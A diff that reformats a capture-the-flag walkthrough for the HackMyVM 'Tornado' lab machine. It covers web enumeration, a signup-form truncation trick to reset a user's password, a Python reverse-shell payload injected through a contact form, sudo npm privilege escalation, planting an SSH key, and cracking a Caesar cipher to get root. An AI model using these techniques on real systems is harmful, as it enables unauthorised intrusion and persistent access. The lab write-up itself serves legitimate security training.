@@ -1,10 +1,19 @@
 ### https://hackmyvm.eu/machines/machine.php?vm=Tornado ###
 
+## Walkthrough
+
+
+
+```bash
 ip=<targetIP>
 url=http://$ip
+```
 
+```bash
 threader3000
+```
 
+```text
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 | ssh-hostkey: 
@@ -15,20 +24,27 @@ PORT   STATE SERVICE VERSION
 |_http-title: Apache2 Debian Default Page: It works
 |_http-server-header: Apache/2.4.38 (Debian)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
 
 
+```bash
 feroxbuster -n -w  /usr/share/seclists//Discovery/Web-Content/directory-list-2.3-medium.txt -u $url -x php,txt,tar,zip,old,bak -t 60 -e 
+```
 
 
 
 we found 
 301      GET        9l       28w      314c http://$ip/bluesky => http://$ip/bluesky/
 
+```bash
 feroxbuster -n -w  /usr/share/seclists//Discovery/Web-Content/directory-list-2.3-medium.txt -u $url/bluesky -x php,txt,tar,zip,old,bak -t 60 -e 
+```
 
+```text
 200      GET       38l       71w      825c http://$ip/bluesky/signup.php
 200      GET       38l       71w      824c http://$ip/bluesky/login.php
+```
 
 
 lets create an account on signup page
@@ -40,13 +56,17 @@ going to Portfolio
 We get the following msg
 LFI vulnerability is patched , but still don't forget to test for it again ! 
 
+```bash
 view-source:http://$ip/bluesky/port.php
+```
 
 <!-- /home/tornado/imp.txt -->    ( line 165 )
 
 i tried http://$ip/../../../home/tornado/imp.txt // not working //
 
+```bash
 /home/tornado/imp.txt is the same with ~/imp.txt
+```
 
 lets try http://$ip/bluesky/~/imp.txt // Not Working //
 lets try http://$ip/bluesky/~tornado/imp.txt // Not Working //
@@ -86,7 +106,7 @@ Upgrade-Insecure-Requests: 1
 uname=jacob%40tornado&upass=1234&btn=Signup
 
 
-//// CHANGE uname=jacob%40tornado 1&upass=1234&btn=Signup /////
+CHANGE uname=jacob%40tornado 1&upass=1234&btn=Signup /////
 
 and forward
 
@@ -95,33 +115,47 @@ Now you have succesfuly reseted jacobs password.
 
 login and go to contact
 
+```bash
 nc -lvnp <CHOSE A PORT>
+```
 
 insert python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR IP",YOUR PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 
 Upgrade the shell
 
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
 
 ctrl+z
 
+```bash
 stty -a; stty raw -echo; fg
+```
 
+```bash
 export SHELL=bash
 export TERM=xterm
 stty rows (values from stty -a) cols (values from stty -a)
+```
 
 
 
+```bash
 sudo -l 
+```
 
 (catchme) NOPASSWD: /usr/bin/nmp
 
+```bash
 cd /tmp
 mkdir cool
 cd cool
+```
 
+```bash
 pico package.json
+```
 
 {
   "name": "cool",
@@ -138,30 +172,42 @@ pico package.json
 
 
 
+```bash
 nc -nvlp 1234
+```
 
 back to the RS
+```bash
 sudo -u catchme /usr/bin/npm run cool
+```
 
 check your listener
 
 id
+```text
 uid=1000(catchme) gid=1000(catchme) groups=1000(catchme),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+```
 
+```bash
 cd
 mkdir .ssh
 chmod 755 .ssh
 cd .ssh
 echo 'ssh-rsa <YOUR id_rsa>' >> authorized_keys
 chmod 644 authorized_keys
+```
 
 exit
 
+```bash
 ssh catchme@$ip  
 catchme@tornado:~$ ls
+```
 enc.py  user.txt
 
+```bash
 cat enc.py 
+```
 s = "abcdefghijklmnopqrstuvwxyz"
 shift=0
 encrypted="hcjqnnsotrrwnqc"
@@ -174,12 +220,18 @@ if len(k) > 1:
 
 Decrypt the encrypted string
 
+```bash
 https://md5decrypt.net/en/Caesar/
+```
 add hcjqnnsotrrwnqc to the left sight and play with the shift 1..2..3 etc
 
 When you find the correct shift you will get "somehow" the password
 then think about it and you will get the correct password
 
+```bash
 catchme@tornado:~$ su root
+```
 Password: 
+```text
 root@tornado:/home/catchme# 
+```
